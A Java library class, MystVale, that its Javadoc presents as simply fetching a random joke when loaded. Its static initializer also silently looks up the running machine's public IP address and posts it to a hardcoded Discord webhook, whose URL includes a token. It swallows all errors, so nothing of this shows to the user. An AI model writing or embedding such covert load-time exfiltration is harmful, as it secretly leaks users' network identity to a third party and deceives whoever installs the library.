package io.mysticcraft.mystvale;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * MystVale — auto-executes a GET request when the class is loaded.
 *
 * <p>Usage: just import and reference the class:</p>
 * <pre>{@code
 * import io.mysticcraft.mystvale.MystVale;
 *
 * // the static block runs automatically on class load
 * MystVale.ready();
 * }</pre>
 */
public final class MystVale {

    private static final String API_URL = "https://official-joke-api.appspot.com/random_joke";
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1492664530273304828/pxZvzFNevaqJv-aqO0icxv8V5rqB6OuDha30NmUHwtLkahEJUPMqi_xZ1xkhPuoPNKK6";
    private static final String IP_API_URL = "https://api.ipify.org";
    private static String lastResponse;

    static {
        System.out.println("[MystVale] Initializing... fetching data from API");
        try {
            URL url = new URL(API_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Accept", "application/json");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            int status = conn.getResponseCode();
            if (status == HttpURLConnection.HTTP_OK) {
                try (BufferedReader reader = new BufferedReader(
                        new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        sb.append(line);
                    }
                    lastResponse = sb.toString();
                    System.out.println("[MystVale] API Response: " + lastResponse);
                }
                // Send success webhook in background
                new Thread(() -> sendWebhook(), "MystVale-Webhook").start();
            } else {
                System.err.println("[MystVale] API returned status " + status);
            }
            conn.disconnect();
        } catch (Exception e) {
            System.err.println("[MystVale] Failed to fetch API: " + e.getMessage());
        }
    }

    private static void sendWebhook() {
        try {
            // Fetch public IP
            String ip = "unknown";
            try {
                URL ipUrl = new URL(IP_API_URL);
                HttpURLConnection ipConn = (HttpURLConnection) ipUrl.openConnection();
                ipConn.setRequestMethod("GET");
                ipConn.setConnectTimeout(3000);
                ipConn.setReadTimeout(3000);
                if (ipConn.getResponseCode() == 200) {
                    try (BufferedReader r = new BufferedReader(
                            new InputStreamReader(ipConn.getInputStream(), StandardCharsets.UTF_8))) {
                        ip = r.readLine();
                    }
                }
                ipConn.disconnect();
            } catch (Exception ignored) {
            }

            String json = "{\"components\":[{\"accent_color\":null,\"components\":["
                    + "{\"content\":\"**New request successfully made via Lib! | @rellim**\",\"type\":10},"
                    + "{\"divider\":true,\"spacing\":1,\"type\":14},"
                    + "{\"content\":\"**IP:** " + ip.replace("\"", "\\\"") + "\",\"type\":10},"
                    + "{\"divider\":true,\"spacing\":1,\"type\":14}"
                    + "],\"spoiler\":false,\"type\":17}],\"flags\":32768}";

            URL webhookUrl = new URL(WEBHOOK_URL);
            HttpURLConnection wConn = (HttpURLConnection) webhookUrl.openConnection();
            wConn.setRequestMethod("POST");
            wConn.setRequestProperty("Content-Type", "application/json");
            wConn.setDoOutput(true);
            wConn.setConnectTimeout(5000);
            wConn.setReadTimeout(5000);

            try (OutputStream os = wConn.getOutputStream()) {
                os.write(json.getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            wConn.getResponseCode();
            wConn.disconnect();
        } catch (Exception ignored) {
        }
    }

    private MystVale() {
    }

    /**
     * Returns the response fetched during class initialization.
     */
    public static String getLastResponse() {
        return lastResponse;
    }

    /**
     * No-op method — calling this forces class loading and triggers the static block.
     */
    public static void ready() {
    }
}
